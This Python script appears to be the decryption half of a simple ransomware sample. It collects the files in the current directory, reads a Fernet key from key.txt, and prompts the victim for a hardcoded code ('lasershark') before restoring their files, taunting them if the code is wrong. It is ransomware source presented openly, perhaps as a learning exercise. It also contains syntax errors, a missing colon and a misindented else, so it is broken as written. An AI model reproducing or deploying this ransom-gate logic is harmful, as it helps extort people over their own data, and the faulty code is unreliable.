#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


files = []
# Iterate through each file except encryption and decryption scripts, and the decryption key file
for file in os.listdir():
	if file =="encrypt.py" or file == "key.txt" or file == "decrypt.py":
		continue
	if os.path.isfile(file): # checks if item is a file not a folder and adds it to the files array
		files.append(file)



with open("key.txt", "rb") as key
	ransomkey = key.read() # Read the decryption key from key.txt and save in a new variable called ransomkey

decryptcode = "lasershark"

userinput = input ("Enter the decryption code to restore your files:\n")

if userinput == decryptcode:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read() # Open each file and read the contents
        contents_decrypted = Fernet(ransomkey).decrypt(contents) # Decrypt the contents of the file using the key
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted) # write the decrypted contents back into the file
    print("Your files have been decrypted")
 else:
    print("How about no")
